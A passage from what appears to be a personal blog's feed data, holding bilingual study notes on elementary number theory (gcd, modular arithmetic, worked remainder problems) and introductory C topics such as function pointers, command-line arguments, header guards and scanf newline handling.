src="/2024/09/27/Math/Set-theory/2024-10-15-15-01-29.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Number Theory</title>
      <link href="/2024/09/26/Math/Number-Theory/"/>
      <url>/2024/09/26/Math/Number-Theory/</url>
      
        <content type="html"><![CDATA[<p>早期数学笔记，大量使用chatGPT辅助，当时不会Tex，直接放图；中英混杂，但是数论基础部分，不再进行整理。</p><ul><li><a href="#basic-knowledge">Basic Knowledge</a></li><li><a href="#divisibility">Divisibility</a></li><li><a href="#greatest-common-divisor-and-least-common-multiple">Greatest Common Divisor and Least Common Multiple</a></li><li><a href="#euclidean-algorithm">Euclidean Algorithm</a></li><li><a href="#modular-arithmetic">Modular Arithmetic</a></li><li><a href="#模余公式及证明">模余公式及证明</a></li><li><a href="#课堂小问题-question-on-ed-forum">课堂小问题 Question on ED forum</a></li><li><a href="#大数求余">大数求余</a><ul><li><a href="#102021--7--">10^2021 % 7 = ?</a></li><li><a href="#what-is-the-last-digit-of-72023">What is the last digit of $7^{2023}$?</a></li></ul></li><li><a href="#questionn--abcd-is-divisible-by-9-if-and-only-if-the-digit-sum-a--b-cd-is-divisible-by-9">Question:n = abcd is divisible by 9 if and only if the digit sum a + b +c+d is divisible by 9</a></li><li><a href="#euclidean-algorithm-1">Euclidean Algorithm</a></li><li><a href="#proof-multiples-of-k-between-n-and-m-inclusive">Proof multiples of k between n and m (inclusive)（??）</a></li><li><a href="#gcdmnlcmmnmn">gcd(m,n)<em>lcm(m,n)=|m|</em>|n|</a></li><li><a href="#for-mn--z-if-m--n-then-gcdmn--gcdmnn">For m,n ∈ Z, if m > n then gcd(m,n) = gcd(m−n,n)</a></li><li><a href="#how-many-numbers-between-1-and-653-are-divisible-by-3-or-5">How many numbers between 1 and 653 are divisible by 3 or 5?</a></li><li><a href="#suppose-that-n-is-a-positive-integer-explain-why-n-and-n--1-are-coprime">Suppose that n is a positive integer. Explain why n and n + 1 are coprime.</a></li><li><a href="#find-the-last-two-digits-of-777">Find the last two digits of $7^{7^{7}}$</a></li><li><a href="#find-the-least-positive-integer-n-for-which-5n--17--16-hence-evaluate-5200--17">Find the least positive integer n for which 5n % 17 = 16. Hence, evaluate 5200 % 17.</a></li></ul><h1 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-03-15.png" alt></p><pre><code>Real Number【R】-&gt; Rational #【Q】-&gt; -&gt; 整数【Z】【含 自然数【N】（0不属于自然数）】-&gt; -&gt; 分数【有限 和 无限循环小数】-&gt; Irrational # (满足条件1 小数 2 无线不循环)</code></pre><p>Natural: {0,1,2,3,4,5,…}</p><p>0是自然数</p><p>上取整和下取整</p><script type="math/tex; mode=display">\left\lfloor \pi \right\rfloor = 3 = \left\lceil e \right\rceil</script><p>乘数</p><ol><li>multiplier</li><li>multiplicator</li></ol><p>乘积<br>product</p><p>除数<br>divisor</p><p>被除数<br>dividend</p><p>商<br>quotient</p><p>幂<br>power</p><p>求余<br>Find the remainder</p><p>极坐标<br>Pol: polar coordinates</p><p>直角坐标：<br>Rec: Rectangular coordinates</p><p>带分数：mixed num<br>integer part + fractional part</p><p>假分数(improper fraction)：分子&gt;=分母</p><p>分子：numerator</p><p>分母：denominator</p><p>notion:概念，主张</p><h1 id="Divisibility"><a href="#Divisibility" class="headerlink" title="Divisibility"></a>Divisibility</h1><p>m|n</p><p>m divides n if n=k*m for some k  </p><p>1|n<br>true</p><p>-1|n<br>true</p><p>任何数可以整除0，但是0不能整除任何数字（除非0）, 因为任何数的0倍就是0</p><p>0|n (only when n=0)<br>(notice, 0|n is False, just when n=0, it is True)</p><p>n|0<br>True<br>(Notice, 0 is anything’s product, cause the other multiplier is 0)</p><p>n|1<br>false   only when  $n=\pm 1$</p><h1 id="Greatest-Common-Divisor-and-Least-Common-Multiple"><a href="#Greatest-Common-Divisor-and-Least-Common-Multiple" class="headerlink" title="Greatest Common Divisor and Least Common Multiple"></a>Greatest Common Divisor and Least Common Multiple</h1><p>Let m,n ∈ Z</p><p>The <strong>greatest common divisor</strong> of m and n, gcd(m,n), is the<br>largest <strong>positive</strong> d ∈ Z such that d|m and d|n.</p><p>The <strong>least common multiple</strong> of m and n, lcm(m,n), is the<br>smallest <strong>positive</strong> k ∈ Z such that m|k and n|k.</p><p>Exception: <strong>gcd(0,0) = lcm(0,n) = lcm(m,0) = 0</strong></p><p>gcd(m,n) and lcm(m,n) are always <strong>taken as non-negative</strong> even if m or n is negative.</p><p>gcd和lcm与正负数无关，直接把负号变正号即可。</p><p>Fact:</p><p><strong>gcd(m,n)*lcm(m,n)=|m|*|n|</strong></p><p>对此证明直接搜<br>gcd(0,n)=n<br>lcm(0,n)=0</p><h1 id="Euclidean-Algorithm"><a href="#Euclidean-Algorithm" class="headerlink" title="Euclidean Algorithm"></a>Euclidean Algorithm</h1><p>大的数字减去小的数字，直到相同</p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-10-21.png" alt></p><p>gcd(45,27)=gcd(18,27)=gcd(18,9)=gcd(9,9)=9</p><p>gcd(108,8)=gcd(100,8)=gcd(92,8)=…=gcd(4,4)=4</p><h1 id="Modular-Arithmetic"><a href="#Modular-Arithmetic" class="headerlink" title="Modular Arithmetic"></a>Modular Arithmetic</h1><p>模运算</p><p>4的5次方：4 to the fifth power</p><p>For $m ∈ Z, n ∈ \mathbb{Z}_{&gt;0}$   there exists q,r ∈ Z with 0 ≤ r &lt; n</p><p>such that </p><p>m=q·n+r</p><script type="math/tex; mode=display">q=\left\lfloor \frac{m}{n} \right\rfloor\\r =m−q·n</script><p>Let m,p ∈ Z, n ∈ Z&gt;0.</p><p>m div n = $\left\lfloor \frac{m}{n} \right\rfloor$</p><p>m % n=m−(mdivn)·n </p><p>m=p   | mod n  if n|(m-p)</p><h1 id="模余公式及证明"><a href="#模余公式及证明" class="headerlink" title="模余公式及证明"></a>模余公式及证明</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-13-11.png" alt></p><p>对第二个证明：</p><pre><code>proof:m%n=m-(m div n)*np%n=p-(m div n)*n=&gt;given m=p |mod nwe need to prove m%n=p%nm%n – p%n = (m-p)-[(m div n) – (p div n)]*n     ......(1)=&gt; n|(1)</code></pre><p>对第四个证明：</p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-15-45.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-16-19.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-16-38.png" alt></p><h1 id="课堂小问题-Question-on-ED-forum"><a href="#课堂小问题-Question-on-ED-forum" class="headerlink" title="课堂小问题 Question on ED forum"></a>课堂小问题 Question on ED forum</h1><pre><code>( a + b ) % n = ( a % n ) + ( b % n)is False, and you said( a + b ) % n =(n) ( a % n ) + ( b % n)IS CORRECT.</code></pre><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-18-19.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/my_proof.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/my_proof2.png" alt></p><p>Here is Paul Hunter’s proof, he used the first principle and definition to prove the formula:</p><p><img src="/2024/09/26/Math/Number-Theory/Hunter_proof.png" alt></p><h1 id="大数求余"><a href="#大数求余" class="headerlink" title="大数求余"></a>大数求余</h1><p>先说下大数求余，从1次方开始向N次方推，直到找到余数为1，则是一个循环。</p><p>如下的10的n次方，从10^1算到10^6%6=1，因为算到1，左右再乘10^1=3 (mod 7)，会发现就开始循环了。因此，要找到余数为1的那个次方比如这里是6个数发现的，然后直接分解 2021%6=5，直接找第五个数（同10^5%7）得到5</p><h2 id="10-2021-7"><a href="#10-2021-7" class="headerlink" title="10^2021 % 7 = ?"></a>10^2021 % 7 = ?</h2><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-19-29.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-19-49.png" alt></p><h2 id="What-is-the-last-digit-of-7-2023"><a href="#What-is-the-last-digit-of-7-2023" class="headerlink" title="What is the last digit of $7^{2023}$?"></a>What is the last digit of $7^{2023}$?</h2><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-20-24.png" alt></p><h1 id="Question-n-abcd-is-divisible-by-9-if-and-only-if-the-digit-sum-a-b-c-d-is-divisible-by-9"><a href="#Question-n-abcd-is-divisible-by-9-if-and-only-if-the-digit-sum-a-b-c-d-is-divisible-by-9" class="headerlink" title="Question:n = abcd is divisible by 9 if and only if the digit sum a + b +c+d is divisible by 9"></a>Question:n = abcd is divisible by 9 if and only if the digit sum a + b +c+d is divisible by 9</h1><p>Show that the 4 digit number n = abcd is divisible by 9<br>if and only if the digit sum a + b +c+d is divisible by 9.</p><pre><code>n = a*10^3+b*10^2+c*10+d (mod 9)= a*1 + b*1 + c*1 + d (mod 9)= a+b+c+d (mod 9)</code></pre><h1 id="Euclidean-Algorithm-1"><a href="#Euclidean-Algorithm-1" class="headerlink" title="Euclidean Algorithm"></a>Euclidean Algorithm</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-21-00.png" alt></p><h1 id="Proof-multiples-of-k-between-n-and-m-inclusive-（-）"><a href="#Proof-multiples-of-k-between-n-and-m-inclusive-（-）" class="headerlink" title="Proof multiples of k between n and m (inclusive)（??）"></a>Proof multiples of k between n and m (inclusive)（??）</h1><p><a href="https://edstem.org/au/courses/19133/discussion/2218972">https://edstem.org/au/courses/19133/discussion/2218972</a></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-21-30.png" alt></p><p>这个题我做到</p><script type="math/tex; mode=display">q=\left\lfloor \frac{m}{k} \right\rfloor - \left\lceil \frac{n}{k} \right\rceil +1</script><p>但是和上图的这个答案还是不太一样，此时我有问题，ED forum上问了下。</p><p>（不放我自己的详细笔记了，参考下图tutor的解法）</p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-23-53.png" alt></p><p>好人之证明：</p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-24-07.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-24-43.png" alt></p><h1 id="gcd-m-n-lcm-m-n-m-n"><a href="#gcd-m-n-lcm-m-n-m-n" class="headerlink" title="gcd(m,n)lcm(m,n)=|m||n|"></a>gcd(m,n)<em>lcm(m,n)=|m|</em>|n|</h1><p>关键点：</p><p>可以把任何数字，拆分成N个素数的幂的乘积<br>比如13是  $13=2 \times 5^0 \times 7^0 \times 11^0 \times 13$</p><p>提醒下，素数是从2开始的，最小的素数是2</p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-27-05.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-27-18.png" alt></p><h1 id="For-m-n-∈-Z-if-m-gt-n-then-gcd-m-n-gcd-m−n-n"><a href="#For-m-n-∈-Z-if-m-gt-n-then-gcd-m-n-gcd-m−n-n" class="headerlink" title="For m,n ∈ Z, if m &gt; n then gcd(m,n) = gcd(m−n,n)"></a>For m,n ∈ Z, if m &gt; n then gcd(m,n) = gcd(m−n,n)</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-27-43.png" alt></p><h1 id="How-many-numbers-between-1-and-653-are-divisible-by-3-or-5"><a href="#How-many-numbers-between-1-and-653-are-divisible-by-3-or-5" class="headerlink" title="How many numbers between 1 and 653 are divisible by 3 or 5?"></a>How many numbers between 1 and 653 are divisible by 3 or 5?</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-28-11.png" alt></p><pre><code>1.    算[1,653]中3的倍数的个数最小是3，最大是651，N(3)=(651-3)/3 + 1 = 2172.    算5的倍数the smallest is 5, and the largest # is 650So N(5)=(650-5)/5 + 1 = 1303.    find the # of the multiples of 15The smallest is 15, and the largest # is 645So N(15)=(645-15)/15 + 1 = 43So we calcute N(3) + N(5) – N(15) = 217+130-43 = 304</code></pre><h1 id="Suppose-that-n-is-a-positive-integer-Explain-why-n-and-n-1-are-coprime"><a href="#Suppose-that-n-is-a-positive-integer-Explain-why-n-and-n-1-are-coprime" class="headerlink" title="Suppose that n is a positive integer. Explain why n and n + 1 are coprime."></a>Suppose that n is a positive integer. Explain why n and n + 1 are coprime.</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-28-47.png" alt></p><h1 id="Find-the-last-two-digits-of-7-7-7"><a href="#Find-the-last-two-digits-of-7-7-7" class="headerlink" title="Find the last two digits of $7^{7^{7}}$"></a>Find the last two digits of $7^{7^{7}}$</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-29-22.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-29-32.png" alt></p><p>$7^7$ -(4*205885)=3</p><p>so it is 43.</p><h1 id="Find-the-least-positive-integer-n-for-which-5n-17-16-Hence-evaluate-5200-17"><a href="#Find-the-least-positive-integer-n-for-which-5n-17-16-Hence-evaluate-5200-17" class="headerlink" title="Find the least positive integer n for which 5n % 17 = 16. Hence, evaluate 5200 % 17."></a>Find the least positive integer n for which 5n % 17 = 16. Hence, evaluate 5200 % 17.</h1><p>巧妙之处在于，考虑到%17时，16=-1，所以-1的平方就是1，这就是一个循环。</p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-30-49.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>basic</title>
      <link href="/2024/09/10/Cpp/basic/"/>
      <url>/2024/09/10/Cpp/basic/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#结构体访问成员变量">结构体访问成员变量</a></li><li><a href="#typedef定义新类型">Typedef:定义新类型</a></li><li><a href="#函数指针">函数指针</a><ul><li><a href="#使用场景">使用场景</a><ul><li><a href="#1回调函数-callback-functions">1.回调函数 (Callback Functions)</a></li><li><a href="#2实现策略模式或动态函数调用">2.实现策略模式或动态函数调用</a></li></ul></li></ul></li><li><a href="#传递命令行参数参数数量-参数值-环境变量值">传递命令行参数:参数数量 参数值 环境变量值</a><ul><li><a href="#参数数量-参数值">参数数量 参数值</a></li><li><a href="#环境变量值">环境变量值</a></li></ul></li></ul><h1 id="结构体访问成员变量"><a href="#结构体访问成员变量" class="headerlink" title="结构体访问成员变量"></a>结构体访问成员变量</h1><p>假设有一个结构体 struct Point 和一个指向 Point 的指针：</p><pre><code>struct Point &#123;    int x;    int y;&#125;;struct Point p = &#123;10, 20&#125;;struct Point *p_ptr = &amp;p;</code></pre><p>可以通过 -&gt; 运算符访问结构体 p 的成员 x 和 y，如下</p><pre><code>int x_val = p_ptr-&gt;x;  // 等同于 (*p_ptr).xint y_val = p_ptr-&gt;y;</code></pre><p>为什么使用 <code>-&gt;</code></p><p>简便性：-&gt; 是 (<em>p_ptr).x 的简写，避免了使用 </em> 和 () 的繁琐语法。</p><p>指针访问：-&gt; 直接表示对结构体指针成员的访问，方便理解。</p><h1 id="Typedef-定义新类型"><a href="#Typedef-定义新类型" class="headerlink" title="Typedef:定义新类型"></a>Typedef:定义新类型</h1><p>C allows us to define new data type (names) via typedef:</p><p>typedef <strong>ExistingDataType</strong> <strong>NewTypeName</strong>;</p><p>Examples:</p><pre><code>typedef float Temperature;typedef int Matrix[20][20];</code></pre><h1 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h1><p>我的理解，就是 typedef 定义一个名字，声明 参数、返回值 是些啥。然后这个名字，当作类型声明，快速复制其他名字的函数。</p><p>注意，赋值给其他新函数名字的时候，后面的函数名字加不加&amp;都可以，因为C会实际将其处理为函数地址。</p><pre><code>// Define a function pointer type, which points to a functiontypedef int (*ComparatorFuncPtr)(int, int);int IsLarger(int a, int b) &#123;    return a &gt; b;&#125;ComparatorFuncPtr fptr = &amp;IsLarger;  </code></pre><p>或如：</p><pre><code>typedef int (*ComparatorFuncPtr)(int, int);int IsLarger(int a, int b) &#123;    return a &gt; b;&#125;ComparatorFuncPtr fptr1 = IsLarger;  // Implicit pointerComparatorFuncPtr fptr2 = &amp;IsLarger; // Explicit pointerint result1 = fptr1(5, 3);  // Calls IsLarger(5, 3)int result2 = fptr2(5, 3);  // Also calls IsLarger(5, 3)</code></pre><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><h3 id="1-回调函数-Callback-Functions"><a href="#1-回调函数-Callback-Functions" class="headerlink" title="1.回调函数 (Callback Functions)"></a>1.回调函数 (Callback Functions)</h3><p>函数指针可以作为参数传递给另一个函数，通常用于回调机制。在某些场景下，比如排序、事件驱动程序或者信号处理，你可以将特定的函数通过函数指针传递给库函数，库函数在合适的时机调用你传递的函数。</p><p>示例：使用函数指针作为回调函数</p><pre><code>#include &lt;stdio.h&gt;void callback(int result) &#123;    printf(&quot;Callback called with result: %d\n&quot;, result);&#125;void compute(int a, int b, void (*callbackFunc)(int)) &#123;    int sum = a + b;    callbackFunc(sum);  // 调用传入的回调函数&#125;int main() &#123;    compute(3, 4, callback);  // 传入 callback 函数指针    return 0;&#125;</code></pre><p>在这个例子中，compute函数接收一个函数指针参数 callbackFunc，然后在合适的时候调用这个函数。</p><h3 id="2-实现策略模式或动态函数调用"><a href="#2-实现策略模式或动态函数调用" class="headerlink" title="2.实现策略模式或动态函数调用"></a>2.实现策略模式或动态函数调用</h3><p>函数指针可以让你在程序运行时选择不同的函数来执行相同的任务。这在实现不同的策略或行为时非常有用，比如不同的排序规则、比较函数、或者动态处理不同类型的数据。<br>示例：不同的比较函数传递给排序算法</p><pre><code>#include &lt;stdio.h&gt;// 比较函数int ascending(int a, int b) &#123;    return a - b;&#125;int descending(int a, int b) &#123;    return b - a;&#125;// 使用函数指针的通用排序函数void sort(int* arr, int size, int (*compare)(int, int)) &#123;    for (int i = 0; i &lt; size - 1; i++) &#123;        for (int j = i + 1; j &lt; size; j++) &#123;            if (compare(arr[i], arr[j]) &gt; 0) &#123;                int temp = arr[i];                arr[i] = arr[j];                arr[j] = temp;            &#125;        &#125;    &#125;&#125;int main() &#123;    int arr[] = &#123;5, 2, 9, 1, 5, 6&#125;;    int size = sizeof(arr) / sizeof(arr[0]);    sort(arr, size, ascending);  // 使用升序比较    for (int i = 0; i &lt; size; i++) &#123;        printf(&quot;%d &quot;, arr[i]);    &#125;    printf(&quot;\n&quot;);    sort(arr, size, descending);  // 使用降序比较    for (int i = 0; i &lt; size; i++) &#123;        printf(&quot;%d &quot;, arr[i]);    &#125;    printf(&quot;\n&quot;);    return 0;&#125;</code></pre><h1 id="传递命令行参数-参数数量-参数值-环境变量值"><a href="#传递命令行参数-参数数量-参数值-环境变量值" class="headerlink" title="传递命令行参数:参数数量 参数值 环境变量值"></a>传递命令行参数:参数数量 参数值 环境变量值</h1><p>首先注意啊，argv 和 env都存储的是字符串，如果你输入参数是数字，需要转换成数字才行</p><h2 id="参数数量-参数值"><a href="#参数数量-参数值" class="headerlink" title="参数数量 参数值"></a>参数数量 参数值</h2><p>argc (Argument Count)</p><p>./my_program arg1 arg2 arg3</p><p>argc will be 4:<br><strong>argv[0]</strong> is the <strong>name of the program</strong> (“./my_program”).</p><pre><code>argv[1] is &quot;arg1&quot;.argv[2] is &quot;arg2&quot;.argv[3] is &quot;arg3&quot;.</code></pre><p>argv (Argument Vector)</p><p><strong>char </strong>argv<strong> or </strong>char <em>argv[]*</em></p><p>这是个存储 char<em> 的数组，char </em>是字符指针，指向不同字符串的首地址（第一个字符的地址）</p><p>比如我们传参，</p><pre><code>./exe aaa bbb</code></pre><p>程序中，</p><pre><code>Char a[]=“aaa”Char b[]=“bbb”Char c[]=“ccc”</code></pre><p>a,b,c名字本身就是char<em>，或者说，<em>*首地址</em></em></p><p>char <em>a = “hello”; char </em>b = “world”; char *c = “example”;</p><p>argv 是一个<strong>指针数组</strong>，也就是存储多个 <strong>char*</strong> 的数组。每个元素都是一个字符指针，指向一个字符串。</p><p>具体来说，argv 的类型是 char<em>*，表示它是“字符指针的指针”。换句话说，它是一个数组，其中的每个元素都是 char</em>，这些 char* 指向的是具体的字符串（即字符数组）。</p><pre><code>argv[0] is the name of the program (or the path used to execute it).argv[1] to argv[argc-1] are the actual arguments passed to the program.int main(int argc, char **argv, char **env)&#123;  Print(“argc = %d\n”, argc);  Print(“argv[0] = %d\n”, argv[0]);  Print(“argv[1] = %d\n”, argv[1]);  For (int I=0; i&lt;argc; i++)&#123;    Xxx  &#125;&#125;</code></pre><h2 id="环境变量值"><a href="#环境变量值" class="headerlink" title="环境变量值"></a>环境变量值</h2><p>char <em>*env 或 char </em>env[]</p><p>形式同char **agv，env是编译器默认定义好的数组</p><p>这些字符串是环境变量的名称和值，通常以 <strong>“NAME=VALUE”</strong></p><pre><code>#include &lt;stdio.h&gt;int main(int argc, char **argv, char **env) &#123;    // 遍历并打印所有环境变量    for (int i = 0; env[i] != NULL; i++) &#123;        printf(&quot;%s\n&quot;, env[i]);    &#125;    return 0;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>header file</title>
      <link href="/2024/09/10/Cpp/header-file/"/>
      <url>/2024/09/10/Cpp/header-file/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#如何写头文件">如何写头文件</a></li><li><a href="#h头文件extern关键字">.h头文件extern关键字</a><ul><li><a href="#extern-的主要作用">extern 的主要作用</a></li><li><a href="#只声明变量不声明函数">只声明变量不声明函数</a></li></ul></li><li><a href="#ifndef--避免头文件被重复包含">#ifndef : 避免头文件被重复包含</a><ul><li><a href="#工作原理">工作原理</a></li><li><a href="#示例">示例</a></li></ul></li></ul><h1 id="如何写头文件"><a href="#如何写头文件" class="headerlink" title="如何写头文件"></a>如何写头文件</h1><p><code>.h</code> 不写实现，只写声明，同名的 <code>.c</code> 写实现。</p><p><code>.h</code>可以定义类型，甚至自己的.c文件包括自己的<code>#include &quot;Graph.h&quot;</code>（必须！）来获取这个类型，<code>.c</code>无须自行再定义类型。</p><h1 id="h头文件extern关键字"><a href="#h头文件extern关键字" class="headerlink" title=".h头文件extern关键字"></a>.h头文件extern关键字</h1><p>在 C 语言中，extern 关键字用于声明一个变量或函数是在其他文件中定义的，从而在多个文件间共享数据或函数。这种机制在大型项目中非常有用，可以避免重复定义，提升代码的组织性。</p><h2 id="extern-的主要作用"><a href="#extern-的主要作用" class="headerlink" title="extern 的主要作用"></a>extern 的主要作用</h2><ol><li><p>声明外部变量：通过 <code>extern</code> 声明变量时，<strong>告诉编译器该变量在其他文件中已经定义，当前文件只是引用它</strong>。</p></li><li><p>外部函数的声明：如果一个函数在其他文件中实现，而当前文件想要调用它，可以通过 <code>extern</code> 进行声明，虽然通常在头文件中声明函数时会省略 <code>extern</code> 关键字。</p></li></ol><p>注意事项：仅用于声明：extern 只能声明变量或函数，不能用于定义。定义时不需要 extern。</p><p>默认作用域：如果一个变量在 .c 文件中<strong>不带 extern 关键字</strong>直接声明，那么它在整个文件中有效，但不对其他文件可见。</p><h2 id="只声明变量不声明函数"><a href="#只声明变量不声明函数" class="headerlink" title="只声明变量不声明函数"></a>只声明变量不声明函数</h2><p>extern 实际上可以用于声明函数，不过它在函数声明中通常是可选的。因为默认情况下，函数声明已经具有外部链接性，extern 关键字对函数声明没有额外作用。</p><p>// 声明在其他文件定义的变量</p><pre><code>extern int myVariable;</code></pre><p>// 下面两种写法等价，都是声明函数在其他地方定义</p><pre><code>extern void myFunction();void myFunction();  // 等价于上面的声明</code></pre><h1 id="ifndef-避免头文件被重复包含"><a href="#ifndef-避免头文件被重复包含" class="headerlink" title="#ifndef : 避免头文件被重复包含"></a>#ifndef : 避免头文件被重复包含</h1><p><strong>if not defined</strong>（“如果没有定义”）</p><p><code>#ifndef</code> 是一个预处理指令，用于条件编译。它的主要用途是防止头文件被多次包含。通常，它与 <code>#define</code> 和 <code>#endif</code> 一起使用，以<strong>确保一个文件只会被包含一次。这样可以避免由于重复包含同一文件而导致的编译错误</strong>。</p><p>例子：</p><pre><code>#ifndef EXAMPLE_H#define EXAMPLE_H// 这里是头文件的内容void myFunction();#endif // EXAMPLE_H</code></pre><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><ul><li><p>当编译器第一次遇到 #ifndef EXAMPLE_H 时，由于 EXAMPLE_H 尚未定义，它将继续编译并定义 EXAMPLE_H。</p></li><li><p>如果该头文件被后续其他文件再次包含，#ifndef 会发现 EXAMPLE_H 已经定义，编译器将跳过该文件的内容，从而避免重复定义。</p></li></ul><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>如<code>graph.h</code>直接定义成<code>GRAPH_H</code>即可，不需要真赋值。</p><p>头文件保护的完整示例：</p><pre><code>#ifndef GRAPH_H#define GRAPH_H# define GRAPH_H 实际上并没有给 GRAPH_H 赋予一个具体的值。它只是定义了一个宏，这个宏的存在与否是它的唯一目的。// 头文件内容，例如函数声明和变量声明void myFunction();extern int myVariable;#endif // GRAPH_H</code></pre>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>if-endif</title>
      <link href="/2024/09/10/Cpp/if-endif/"/>
      <url>/2024/09/10/Cpp/if-endif/</url>
      
        <content type="html"><![CDATA[<p>在 Data stucture and Algorithm 的 git 项目学到的：</p><p>这如果是<code>0</code>，就是<strong>真注释</strong>，代码不运行，如果是<code>1</code>，<strong>代码运行</strong></p><pre><code>#if 0#endif</code></pre><p>如：</p><pre><code>#if 1int IsLess(int a, int b) &#123;    return a &lt; b;&#125;int IsLarger(int a, int b) &#123;    return a &gt; b;&#125;// Define a function pointer type, which points to a functiontypedef int (*ComparatorFuncPtr)(int, int);void BubbleSort2(int *ptr, int n, ComparatorFuncPtr compare) &#123;    for (int iMax = n - 2; iMax &gt;= 0; iMax--) &#123;        for (int i = 0; ____Q1_____; _____Q2____) &#123;            if (_____Q3_____) &#123;                ____Q4____;            &#125;        &#125;           &#125;&#125;int TestBubbleSort2(void) &#123;        int arr[] = &#123;30, 50, 20, 10, 60, 40&#125;;    int len = sizeof(arr) / sizeof(arr[0]);    // a function pointer variable which points to the function IsLarger()    ComparatorFuncPtr fptr = &amp;IsLarger;        printf(&quot;Before sorting:\n&quot;);    PrintArray(arr, len);    BubbleSort2(arr, len, fptr);    // in ascending order    printf(&quot;After sorting:\n&quot;);    PrintArray(arr, len);    // a function pointer variable which points to the function IsLess()    fptr = ____Q5____;        printf(&quot;\nBefore sorting:\n&quot;);    PrintArray(arr, len);    BubbleSort2(arr, len, fptr);    // in descending order    printf(&quot;After sorting:\n&quot;);    PrintArray(arr, len);    return 0;&#125;#endif</code></pre>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>how double scanf to eat the line</title>
      <link href="/2024/09/10/Cpp/how-double-scanf-to-eat-the-line/"/>
      <url>/2024/09/10/Cpp/how-double-scanf-to-eat-the-line/</url>
      
        <content type="html"><![CDATA[<p>两个scanf相挨，<strong>若第二个scanf接受单个char类型</strong>，会错误赋值<strong>\n</strong></p><pre><code>Scanf(&lt;阿猫阿狗接受什么都行&gt;)Scanf(“%c”, &amp;char2)</code></pre><p>经过调试，比如我输入<code>a\nb</code>(此处<code>\n</code>是Enter的回车)，会发现第二个<code>scanf(“%c”, &amp;char2)</code>接受的是字符<code>\n</code>，而非<code>b</code>。因此判定，按下Enter会影响第二个scanf的输入，会使得第二个scanf是回车字符。</p><p>scanf、getchar、fgets等是接受<strong>标准输入（stdin）</strong>的函数，如果后面也有接受标准输入的函数，记得<code>getchar</code>去吃掉那个字符。</p><h1 id="处理方法一"><a href="#处理方法一" class="headerlink" title="处理方法一"></a>处理方法一</h1><p>因此，可以使用getchar()吃这个’\n’，但是不需要给其他变量赋值，因为这个’\n’本身没用。</p><pre><code>Scanf(“%c”, &amp;char1)Getchar();Scanf(“%c”, &amp;char2)</code></pre><h1 id="处理方法二"><a href="#处理方法二" class="headerlink" title="处理方法二"></a>处理方法二</h1><p>另一个方法，是第二个<code>scanf(&quot; %c&quot;, &amp;char2)</code>,注意<code>&quot; %c&quot;</code>前面有个<strong>空格</strong>。</p><p>据我推测，这个方法利用了scanf接受数据并非严格格式化字符串输入的特性。</p><p>比如 <code>scanf(“%d %d”, &amp;a, &amp;b)</code>, 输入<code>1 2，1+2</code>，都可以正常通过scanf给a,b两个变量赋值，不一定要严格”1 2”以空格分隔。</p><p><code>scanf(&quot; %c&quot;, &amp;char2)</code> 应该利用了<code>scanf</code>不严格特性，来吃掉那个Enter。</p>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CmakeLists.txt</title>
      <link href="/2024/09/10/Cpp/CmakeLists-txt/"/>
      <url>/2024/09/10/Cpp/CmakeLists-txt/</url>
      
        <content type="html"><![CDATA[<p>Normally we have two methods to compile and build the C/CPP projects: makefile and cmakelist.</p><p>Haven’t researched this yet. But I know how to run a project by <code>CmakeLists.txt</code>. Please refer to <em>Clion Debug Trick</em>.</p><ul><li><a href="#how-to-prepare-compilation-and-build">how to prepare compilation and build</a></li><li><a href="#cmake-project">CMake project</a></li><li><a href="#makefile-project">Makefile project</a></li></ul><h1 id="how-to-prepare-compilation-and-build"><a href="#how-to-prepare-compilation-and-build" class="headerlink" title="how to prepare compilation and build"></a>how to prepare compilation and build</h1><pre><code>sudo apt update</code></pre><h1 id="CMake-project"><a href="#CMake-project" class="headerlink" title="CMake project"></a>CMake 